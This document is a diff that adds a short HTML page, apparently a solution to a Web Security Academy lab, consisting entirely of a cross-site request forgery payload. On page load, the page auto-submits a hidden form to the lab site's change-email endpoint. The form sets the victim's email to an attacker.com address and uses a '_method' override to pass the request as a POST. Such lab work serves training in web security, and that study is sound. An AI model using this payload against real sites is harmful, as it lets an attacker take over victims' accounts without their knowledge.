@@ -1,0 +1,12 @@
+<html>
+	<body>
+		<form action="https://xxxxxxxxxxxxxURLxxxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="gwyo&#64;attacker&#46;com" />
+			<input type="hidden" name="&#95;method" value="POST" />
+		</form>
+		<script>
+			history.pushState('', '', '/');
+			document.forms[0].submit();
+  		</script>
+	</body>
+</html>
